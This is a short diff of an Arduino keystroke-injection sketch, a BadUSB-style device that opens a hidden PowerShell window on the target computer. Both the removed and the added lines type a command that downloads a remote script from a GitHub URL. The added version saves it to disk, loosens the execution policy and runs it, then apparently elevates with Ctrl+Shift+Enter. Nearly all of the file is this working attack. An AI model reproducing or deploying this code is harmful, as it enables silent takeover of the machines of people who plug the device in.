@@ -1,3 +1,4 @@
+
 void setup() { 
     delay(5000);
     Keyboard.press(KEY_LEFT_GUI);
@@ -5,8 +6,8 @@ void setup() {
     Keyboard.releaseAll();
     delay(500);
 
-    Keyboard.print("powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('https://github.com/YcVoz/cookie/raw/master/ab.ps1');");
-    delay(500);
+    Keyboard.println("powershell -windowstyle hidden IEX (new-object System.Net.WebClient).DownloadFile('https://github.com/YcVoz/cookie/raw/master/ab.ps1','D:/ab.ps1');D:;set-executionpolicy remotesigned; ./ab.ps1");
+    delay(100);
     Keyboard.press(KEY_LEFT_CTRL);
     Keyboard.press(KEY_LEFT_SHIFT);
     Keyboard.press(KEY_RETURN);
